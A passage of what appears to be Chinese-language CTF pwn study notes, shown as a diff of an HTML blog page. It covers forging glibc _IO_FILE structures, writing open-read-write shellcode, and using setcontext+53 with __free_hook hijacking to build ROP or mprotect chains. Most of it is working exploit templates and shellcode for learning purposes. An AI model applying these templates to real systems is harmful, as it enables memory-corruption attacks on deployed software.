+<span class="token number">0x18</span>  _IO_read_base
+<span class="token number">0x20</span>  _IO_write_base
+<span class="token number">0x28</span>  _IO_write_ptr
+<span class="token number">0x30</span>  _IO_write_end
+<span class="token number">0x38</span>  _IO_buf_base
+<span class="token number">0x40</span>  _IO_buf_end
+<span class="token number">0x48</span>  _IO_save_base
+<span class="token number">0x50</span>  _IO_backup_base
+<span class="token number">0x58</span>  _IO_save_end
+<span class="token number">0x60</span>  _markers
+<span class="token number">0x68</span>  _chain
+<span class="token number">0x70</span>  _fileno
+<span class="token number">0x74</span>  _flags2
+<span class="token number">0x78</span>  _old_offset
+<span class="token number">0x80</span>  _cur_column
+<span class="token number">0x82</span>  _vtable_offset
+<span class="token number">0x83</span>  _shortbuf
+<span class="token number">0x88</span>  _lock
+<span class="token number">0x90</span>  _offset
+<span class="token number">0x98</span>  _codecvt
+<span class="token number">0xa0</span>  _wide_data
+<span class="token number">0xa8</span>  _freeres_list
+<span class="token number">0xb0</span>  _freeres_buf
+<span class="token number">0xb8</span>  __pad5
+<span class="token number">0xc0</span>  _mode
+<span class="token number">0xc4</span>  _unused2
+<span class="token number">0xd8</span>  vtable</code></pre>
+<p>以及<a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" target="_blank" rel="noopener">veritas501</a>师傅写的IO_FILE结构体伪造模块</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+
+_IO_FILE_plus_size <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'i386'</span><span class="token punctuation">:</span><span class="token number">0x98</span><span class="token punctuation">,</span>
+    <span class="token string">'amd64'</span><span class="token punctuation">:</span><span class="token number">0xe0</span>
+<span class="token punctuation">}</span>
+_IO_FILE_plus <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'i386'</span><span class="token punctuation">:</span><span class="token punctuation">{</span>
+        <span class="token number">0x0</span><span class="token punctuation">:</span><span class="token string">'_flags'</span><span class="token punctuation">,</span>
+        <span class="token number">0x4</span><span class="token punctuation">:</span><span class="token string">'_IO_read_ptr'</span><span class="token punctuation">,</span>
+        <span class="token number">0x8</span><span class="token punctuation">:</span><span class="token string">'_IO_read_end'</span><span class="token punctuation">,</span>
+        <span class="token number">0xc</span><span class="token punctuation">:</span><span class="token string">'_IO_read_base'</span><span class="token punctuation">,</span>
+        <span class="token number">0x10</span><span class="token punctuation">:</span><span class="token string">'_IO_write_base'</span><span class="token punctuation">,</span>
+        <span class="token number">0x14</span><span class="token punctuation">:</span><span class="token string">'_IO_write_ptr'</span><span class="token punctuation">,</span>
+        <span class="token number">0x18</span><span class="token punctuation">:</span><span class="token string">'_IO_write_end'</span><span class="token punctuation">,</span>
+        <span class="token number">0x1c</span><span class="token punctuation">:</span><span class="token string">'_IO_buf_base'</span><span class="token punctuation">,</span>
+        <span class="token number">0x20</span><span class="token punctuation">:</span><span class="token string">'_IO_buf_end'</span><span class="token punctuation">,</span>
+        <span class="token number">0x24</span><span class="token punctuation">:</span><span class="token string">'_IO_save_base'</span><span class="token punctuation">,</span>
+        <span class="token number">0x28</span><span class="token punctuation">:</span><span class="token string">'_IO_backup_base'</span><span class="token punctuation">,</span>
+        <span class="token number">0x2c</span><span class="token punctuation">:</span><span class="token string">'_IO_save_end'</span><span class="token punctuation">,</span>
+        <span class="token number">0x30</span><span class="token punctuation">:</span><span class="token string">'_markers'</span><span class="token punctuation">,</span>
+        <span class="token number">0x34</span><span class="token punctuation">:</span><span class="token string">'_chain'</span><span class="token punctuation">,</span>
+        <span class="token number">0x38</span><span class="token punctuation">:</span><span class="token string">'_fileno'</span><span class="token punctuation">,</span>
+        <span class="token number">0x3c</span><span class="token punctuation">:</span><span class="token string">'_flags2'</span><span class="token punctuation">,</span>
+        <span class="token number">0x40</span><span class="token punctuation">:</span><span class="token string">'_old_offset'</span><span class="token punctuation">,</span>
+        <span class="token number">0x44</span><span class="token punctuation">:</span><span class="token string">'_cur_column'</span><span class="token punctuation">,</span>
+        <span class="token number">0x46</span><span class="token punctuation">:</span><span class="token string">'_vtable_offset'</span><span class="token punctuation">,</span>
+        <span class="token number">0x47</span><span class="token punctuation">:</span><span class="token string">'_shortbuf'</span><span class="token punctuation">,</span>
+        <span class="token number">0x48</span><span class="token punctuation">:</span><span class="token string">'_lock'</span><span class="token punctuation">,</span>
+        <span class="token number">0x4c</span><span class="token punctuation">:</span><span class="token string">'_offset'</span><span class="token punctuation">,</span>
+        <span class="token number">0x54</span><span class="token punctuation">:</span><span class="token string">'_codecvt'</span><span class="token punctuation">,</span>
+        <span class="token number">0x58</span><span class="token punctuation">:</span><span class="token string">'_wide_data'</span><span class="token punctuation">,</span>
+        <span class="token number">0x5c</span><span class="token punctuation">:</span><span class="token string">'_freeres_list'</span><span class="token punctuation">,</span>
+        <span class="token number">0x60</span><span class="token punctuation">:</span><span class="token string">'_freeres_buf'</span><span class="token punctuation">,</span>
+        <span class="token number">0x64</span><span class="token punctuation">:</span><span class="token string">'__pad5'</span><span class="token punctuation">,</span>
+        <span class="token number">0x68</span><span class="token punctuation">:</span><span class="token string">'_mode'</span><span class="token punctuation">,</span>
+        <span class="token number">0x6c</span><span class="token punctuation">:</span><span class="token string">'_unused2'</span><span class="token punctuation">,</span>
+        <span class="token number">0x94</span><span class="token punctuation">:</span><span class="token string">'vtable'</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+
+    <span class="token string">'amd64'</span><span class="token punctuation">:</span><span class="token punctuation">{</span>
+        <span class="token number">0x0</span><span class="token punctuation">:</span><span class="token string">'_flags'</span><span class="token punctuation">,</span>
+        <span class="token number">0x8</span><span class="token punctuation">:</span><span class="token string">'_IO_read_ptr'</span><span class="token punctuation">,</span>
+        <span class="token number">0x10</span><span class="token punctuation">:</span><span class="token string">'_IO_read_end'</span><span class="token punctuation">,</span>
+        <span class="token number">0x18</span><span class="token punctuation">:</span><span class="token string">'_IO_read_base'</span><span class="token punctuation">,</span>
+        <span class="token number">0x20</span><span class="token punctuation">:</span><span class="token string">'_IO_write_base'</span><span class="token punctuation">,</span>
+        <span class="token number">0x28</span><span class="token punctuation">:</span><span class="token string">'_IO_write_ptr'</span><span class="token punctuation">,</span>
+        <span class="token number">0x30</span><span class="token punctuation">:</span><span class="token string">'_IO_write_end'</span><span class="token punctuation">,</span>
+        <span class="token number">0x38</span><span class="token punctuation">:</span><span class="token string">'_IO_buf_base'</span><span class="token punctuation">,</span>
+        <span class="token number">0x40</span><span class="token punctuation">:</span><span class="token string">'_IO_buf_end'</span><span class="token punctuation">,</span>
+        <span class="token number">0x48</span><span class="token punctuation">:</span><span class="token string">'_IO_save_base'</span><span class="token punctuation">,</span>
+        <span class="token number">0x50</span><span class="token punctuation">:</span><span class="token string">'_IO_backup_base'</span><span class="token punctuation">,</span>
+        <span class="token number">0x58</span><span class="token punctuation">:</span><span class="token string">'_IO_save_end'</span><span class="token punctuation">,</span>
+        <span class="token number">0x60</span><span class="token punctuation">:</span><span class="token string">'_markers'</span><span class="token punctuation">,</span>
+        <span class="token number">0x68</span><span class="token punctuation">:</span><span class="token string">'_chain'</span><span class="token punctuation">,</span>
+        <span class="token number">0x70</span><span class="token punctuation">:</span><span class="token string">'_fileno'</span><span class="token punctuation">,</span>
+        <span class="token number">0x74</span><span class="token punctuation">:</span><span class="token string">'_flags2'</span><span class="token punctuation">,</span>
+        <span class="token number">0x78</span><span class="token punctuation">:</span><span class="token string">'_old_offset'</span><span class="token punctuation">,</span>
+        <span class="token number">0x80</span><span class="token punctuation">:</span><span class="token string">'_cur_column'</span><span class="token punctuation">,</span>
+        <span class="token number">0x82</span><span class="token punctuation">:</span><span class="token string">'_vtable_offset'</span><span class="token punctuation">,</span>
+        <span class="token number">0x83</span><span class="token punctuation">:</span><span class="token string">'_shortbuf'</span><span class="token punctuation">,</span>
+        <span class="token number">0x88</span><span class="token punctuation">:</span><span class="token string">'_lock'</span><span class="token punctuation">,</span>
+        <span class="token number">0x90</span><span class="token punctuation">:</span><span class="token string">'_offset'</span><span class="token punctuation">,</span>
+        <span class="token number">0x98</span><span class="token punctuation">:</span><span class="token string">'_codecvt'</span><span class="token punctuation">,</span>
+        <span class="token number">0xa0</span><span class="token punctuation">:</span><span class="token string">'_wide_data'</span><span class="token punctuation">,</span>
+        <span class="token number">0xa8</span><span class="token punctuation">:</span><span class="token string">'_freeres_list'</span><span class="token punctuation">,</span>
+        <span class="token number">0xb0</span><span class="token punctuation">:</span><span class="token string">'_freeres_buf'</span><span class="token punctuation">,</span>
+        <span class="token number">0xb8</span><span class="token punctuation">:</span><span class="token string">'__pad5'</span><span class="token punctuation">,</span>
+        <span class="token number">0xc0</span><span class="token punctuation">:</span><span class="token string">'_mode'</span><span class="token punctuation">,</span>
+        <span class="token number">0xc4</span><span class="token punctuation">:</span><span class="token string">'_unused2'</span><span class="token punctuation">,</span>
+        <span class="token number">0xd8</span><span class="token punctuation">:</span><span class="token string">'vtable'</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name">IO_FILE_plus_struct</span><span class="token punctuation">(</span>dict<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    arch <span class="token operator">=</span> None
+    endian <span class="token operator">=</span> None
+    fake_file <span class="token operator">=</span> None
+    size  <span class="token operator">=</span> <span class="token number">0</span>
+    FILE_struct <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+
+    @LocalContext
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>arch <span class="token operator">=</span> context<span class="token punctuation">.</span>arch
+        self<span class="token punctuation">.</span>endian <span class="token operator">=</span> context<span class="token punctuation">.</span>endian
+
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>arch <span class="token operator">!=</span> <span class="token string">'i386'</span> <span class="token operator">and</span> self<span class="token punctuation">.</span>arch <span class="token operator">!=</span> <span class="token string">'amd64'</span><span class="token punctuation">:</span>
+            log<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'architecture not supported!'</span><span class="token punctuation">)</span>
+        success<span class="token punctuation">(</span><span class="token string">'arch: '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        self<span class="token punctuation">.</span>FILE_struct <span class="token operator">=</span> <span class="token punctuation">[</span>_IO_FILE_plus<span class="token punctuation">[</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i  <span class="token keyword">in</span> sorted<span class="token punctuation">(</span>_IO_FILE_plus<span class="token punctuation">[</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token keyword">print</span> self<span class="token punctuation">.</span>FILE_struct
+        self<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>r<span class="token punctuation">:</span><span class="token number">0</span> <span class="token keyword">for</span> r <span class="token keyword">in</span> self<span class="token punctuation">.</span>FILE_struct<span class="token punctuation">}</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>size <span class="token operator">=</span> _IO_FILE_plus_size<span class="token punctuation">[</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">]</span>
+
+
+    <span class="token keyword">def</span> <span class="token function">__setitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> item<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> item <span class="token operator">not</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>FILE_struct<span class="token punctuation">:</span>
+            log<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"Unknown item %r (not in %r)"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>item<span class="token punctuation">,</span> self<span class="token punctuation">.</span>FILE_struct<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        super<span class="token punctuation">(</span>IO_FILE_plus_struct<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__setitem__<span class="token punctuation">(</span>item<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">__setattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> attr<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> attr <span class="token keyword">in</span> IO_FILE_plus_struct<span class="token punctuation">.</span>__dict__<span class="token punctuation">:</span>
+            super<span class="token punctuation">(</span>IO_FILE_plus_struct<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>attr<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            self<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token operator">=</span>value
+
+    <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> attr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">[</span>attr<span class="token punctuation">]</span>
+
+    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        fake_file <span class="token operator">=</span> <span class="token string">""</span>
+        <span class="token keyword">with</span> context<span class="token punctuation">.</span>local<span class="token punctuation">(</span>arch<span class="token operator">=</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> item_offset <span class="token keyword">in</span> sorted<span class="token punctuation">(</span>self<span class="token punctuation">.</span>item_offset<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">if</span> len<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span> <span class="token operator">&lt;</span> item_offset<span class="token punctuation">:</span>
+                    fake_file <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token punctuation">(</span>item_offset <span class="token operator">-</span> len<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                fake_file <span class="token operator">+=</span> pack<span class="token punctuation">(</span>self<span class="token punctuation">[</span>_IO_FILE_plus<span class="token punctuation">[</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">]</span><span class="token punctuation">[</span>item_offset<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>word_size<span class="token operator">=</span><span class="token string">'all'</span><span class="token punctuation">)</span>
+            fake_file <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>size <span class="token operator">-</span> len<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> fake_file
+
+    @property
+    <span class="token keyword">def</span> <span class="token function">item_offset</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> _IO_FILE_plus<span class="token punctuation">[</span>self<span class="token punctuation">.</span>arch<span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h2 id="0xC-shellcode编写能力"><a href="#0xC-shellcode编写能力" class="headerlink" title="0xC.shellcode编写能力"></a>0xC.shellcode编写能力</h2><p>最常见的也就是orw的编写，题目开启了沙箱，禁止execve系统调用，因此需要通过open-read-write这三步来读出flag</p>
+<pre class=" language-python"><code class="language-python">shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'/home/orw/flag'</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'eax'</span><span class="token punctuation">,</span><span class="token string">'esp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'esp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span></code></pre>
+<p>这是用pwntools的shellcraft模块生成的</p>
+<p>或者是直接手撸汇编</p>
+<pre class=" language-assembly"><code class="language-assembly">shellcode = asm('''
+    push 0x67616c66
+    mov rdi,rsp
+    xor esi,esi
+    push 2
+    pop rax
+    syscall /*open("flag",0)*/
+    mov rdi,rax
+    mov rsi,rsp
+    mov edx,0x100
+    xor eax,eax
+    syscall /*read(rax,rsp,0x100)*/
+    mov edi,1
+    mov rsi,rsp
+    push 1
+    pop rax
+    syscall /*write(1,rsp,0x100)*/
+    ''')</code></pre>
+<p>不过一般情况下能用rop链代替的我都用rop链来</p>
+<p>盲注不仅存在于web的sql注入中，在pwn中也一样存在(不过应该只是在ctf中，但考察的是选手的汇编语言能力)。</p>
+<p>比如蓝帽杯线下的slient，需要将flag一位一位比较出来。</p>
+<p>不过我的汇编基础不够扎实，shellcode题目向来都很头大，难受。</p>
+<h2 id="0xD-glibc线程"><a href="#0xD-glibc线程" class="headerlink" title="0xD.glibc线程"></a>0xD.glibc线程</h2><blockquote>
+<p>在glibc中，线程有自己的arena，但是arena的个数是有限的，一般跟处理器核心个数有关，假如线程个数超过arena总个数，并且执行线程都在使用，那么该怎么办呢。Glibc会遍历所有的arena，首先是从主线程的main_arena开始，尝试lock该arena，如果成功lock，那么就把这个arena给线程使用。</p>
+</blockquote>
+<p>我们通常使用的是main_arena这个线程管理的堆</p>
+<h2 id="0xE-ORW"><a href="#0xE-ORW" class="headerlink" title="0xE.ORW"></a>0xE.ORW</h2><p>在堆漏洞的题目中，为了增加题目难度会禁用execve系统调用，orw就将登场</p>
+<p>无论是2.27，2.29，2.30还是2.31的libc，为了能够执行orw都使用了一个setcontext函数，可以看到这个函数能够设置绝大多数寄存器</p>
+<pre class=" language-assembly"><code class="language-assembly"><setcontext>:     push   rdi
+<setcontext+1>:   lea    rsi,[rdi+0x128]
+<setcontext+8>:   xor    edx,edx
+<setcontext+10>:  mov    edi,0x2
+<setcontext+15>:  mov    r10d,0x8
+<setcontext+21>:  mov    eax,0xe
+<setcontext+26>:  syscall 
+<setcontext+28>:  pop    rdi
+<setcontext+29>:  cmp    rax,0xfffffffffffff001
+<setcontext+35>:  jae    0x7ffff7a7d520 <setcontext+128>
+<setcontext+37>:  mov    rcx,QWORD PTR [rdi+0xe0]
+<setcontext+44>:  fldenv [rcx]
+<setcontext+46>:  ldmxcsr DWORD PTR [rdi+0x1c0]
+<setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]
+<setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]
+<setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]
+<setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]
+<setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]
+<setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]
+<setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]
+<setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]
+<setcontext+94>:  push   rcx
+<setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]
+<setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]
+<setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]
+<setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]
+<setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]
+<setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]
+<setcontext+125>: xor    eax,eax
+<setcontext+127>: ret    
+<setcontext+128>: mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78
+<setcontext+135>: neg    eax
+<setcontext+137>: mov    DWORD PTR fs:[rcx],eax
+<setcontext+140>: or     rax,0xffffffffffffffff
+<setcontext+144>: ret
+</code></pre>
+<p>而我们并不是从头到尾地使用setcontext函数，而是从setcontext+53开始调用，这是因为在setcontext+44处地指令<code>fldenv [rcx]</code>会使程序crash</p>
+<p>首先来说明2.27的libc下orw的构造</p>
+<pre class=" language-assembly"><code class="language-assembly"><setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]
+<setcontext+94>:  push   rcx</code></pre>
+<p>从这两条指令可以看出，从[rdi+0xa8]弹到rcx的值将会是rip</p>
+<p>setcontext的利用分两种，一种需要libc地址和heap地址，另一种只需要libc地址，先说只要libc地址的</p>
+<p>构造模板如下</p>
+<pre class=" language-python"><code class="language-python">free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
+setcontext <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span>
+利用double free或者overlap将free_hook修改为setcontext<span class="token operator">+</span><span class="token number">53</span>
+add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>setcontext<span class="token punctuation">)</span><span class="token punctuation">)</span>
+接着伪造栈空间
+frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+frame<span class="token punctuation">.</span>rax<span class="token operator">=</span><span class="token number">0</span>          <span class="token comment" spellcheck="true">#调用read</span>
+frame<span class="token punctuation">.</span>rdi<span class="token operator">=</span><span class="token number">0</span>          <span class="token comment" spellcheck="true">#参数1     </span>
+frame<span class="token punctuation">.</span>rsi<span class="token operator">=</span>free_hook<span class="token operator">&amp;</span><span class="token number">0xfffffffffffff000</span>    <span class="token comment" spellcheck="true">#参数2 往free_hook&amp;0xfffffffffffff000写</span>
+frame<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0x2000</span>                          <span class="token comment" spellcheck="true">#参数3 写入0x2000字节</span>
+frame<span class="token punctuation">.</span>rsp<span class="token operator">=</span>free_hook<span class="token operator">&amp;</span><span class="token number">0xfffffffffffff000</span>    <span class="token comment" spellcheck="true">#执行完read调用后跳转到free_hook&amp;0xfffffffffffff000</span>
+frame<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscall                         <span class="token comment" spellcheck="true">#rip，执行系统调用</span>
+payload<span class="token operator">=</span>str<span class="token punctuation">(</span>frame<span class="token punctuation">)</span>
+将payload写入到某个chunk中，假设这个chunk序号为<span class="token number">8</span>
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+然后free掉这个chunk触发setcontext
+free<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
+接着我们就能往free_hook<span class="token operator">&amp;</span><span class="token number">0xfffffffffffff00</span>写入shellcode
+payload <span class="token operator">=</span> <span class="token punctuation">[</span>
+    libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdi\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdi; ret;</span>
+    free_hook <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">,</span>
+    libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rsi\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rsi; ret;</span>
+    <span class="token number">0x2000</span><span class="token punctuation">,</span>
+    libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdx\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rdx; ret;</span>
+    <span class="token number">7</span><span class="token punctuation">,</span>
+    libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rax\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: pop rax; ret;</span>
+    <span class="token number">10</span><span class="token punctuation">,</span>
+    syscall<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: syscall; ret;</span>
+    libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"jmp rsp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#: jmp rsp;</span>
+<span class="token punctuation">]</span>
+
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+/*open('flag',0)*/
+sub rsp, 0x800
+push 0x67616c66
+mov rdi, rsp
+xor esi, esi
+mov eax, 2
+syscall
+
+cmp eax, 0
+js failed
+/*read(3,rsp,0x100)*/
+mov edi, eax
+mov rsi, rsp
+mov edx, 0x100
+xor eax, eax
+syscall
+/*write(1,rsp,0x100)*/
+mov edx, eax
+mov rsi, rsp
+mov edi, 1
+mov eax, edi
+syscall
+
+jmp exit
+
+failed:
+push 0x6c696166
+mov edi, 1
+mov rsi, rsp
+mov edx, 4
+mov eax, edi
+syscall
+
+exit:
+xor edi, edi
+mov eax, 231
+syscall
+'''</span><span class="token punctuation">)</span>
+shellcode就是先通过mprotect将free_hook <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span>附近<span class="token number">0x2000</span>的空间设置为可执行，然后进行orw读取flag</code></pre>
+<p>另一种需要堆地址的orw的构造模板如下</p>
+<pre class=" language-python"><code class="language-python">free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
+setcontext <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span>
+利用double free或者overlap将free_hook修改为setcontext<span class="token operator">+</span><span class="token number">53</span>
+add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>setcontext<span class="token punctuation">)</span><span class="token punctuation">)</span>
+将堆的某个地址设置为setcontext执行完后要跳转过来的rsp，在上面布置好ROP链，因为rop执行的是text段的代码，所以不需要mprotect修改权限
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xa0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_rsp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rsp  rip</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> <span class="token string">'./flag\x00\x00'</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
